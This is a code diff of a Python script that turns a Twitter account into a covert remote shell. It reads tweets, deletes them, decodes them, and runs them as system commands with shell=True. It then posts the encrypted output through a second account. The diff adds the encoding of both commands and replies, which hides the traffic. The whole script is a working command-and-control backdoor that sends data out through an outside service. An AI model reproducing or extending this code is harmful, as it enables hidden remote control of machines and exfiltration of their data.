@@ -1,5 +1,5 @@
 import tweepy
-#from newEncrypt import *
+from newEncrypt import *
 import subprocess
 import os
 from time import sleep
@@ -36,7 +36,7 @@ def limit():
 	remain= almost[:2]
 	print str(remain) + " API calls remaining" 
 	if( int(remain) == 0):
-		print "Sleeping for 15 minutes. Maually delete tweets from Twitter page."
+		print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
 		sleep(15*61)
 
 
@@ -51,14 +51,19 @@ def listen():
 			for tweet in public_tweets:
 				test = str(tweet.text)			
 				api.destroy_status(tweet.id)
+				bytes = str.encode(test)
+				type(bytes)	
+				mess = decode(bytes)
+				 
 				#work on cd command here
-				if test[:2] == "cd":
-					os.chdir(test[3:])
+				if mess[:2] == "cd":
+					os.chdir(mess[3:])
 					print "Directory changed."
 				else:
-					response = subprocess.check_output(test, shell=True)
+					response = subprocess.check_output(mess, shell=True)
+					enResponse = encode(response)
 				#if response != "" and repsonse != '/Users/Luke/Desktop/':
-					apiTwo.update_status(response)
+					apiTwo.update_status(enResponse)
 					print response
 				#else:
 					#api.update_status("Directory changed." ) 
